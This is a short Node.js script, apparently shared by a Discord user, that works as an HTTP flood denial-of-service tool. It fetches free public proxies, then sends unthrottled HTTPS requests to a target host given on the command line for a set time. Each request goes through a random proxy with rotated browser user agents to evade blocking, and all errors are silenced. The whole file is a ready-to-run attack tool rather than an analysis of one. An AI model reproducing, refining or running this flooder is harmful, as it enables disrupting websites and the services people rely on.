/**
// Usage : node https [host] [time]
Discord: xRose#1692
Modified
*/ 
var url = require('url');
var fs = require('fs');
var https = require('https');
var request = require('request');
var zlib = require('zlib');
var HttpsProxyAgent = require('https-proxy-agent');

request.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&anonymity=all&ssl=all', (err, res, set) => {
    var proxies = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

const UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
]
var options = {};
var parsed = url.parse(process.argv[2]);
parsed.headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6,la;q=0.5',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'upgrade-insecure-requests': 1,
    'Connection': 'keep-alive',
    'user-agent': UserAgents[Math.floor(Math.random() * UserAgents.length)]
}

setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);

setInterval(function() {
    var options = parsed;
    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);

    https.get(options, function(res) { console.log(res.statusCode); });
});
});
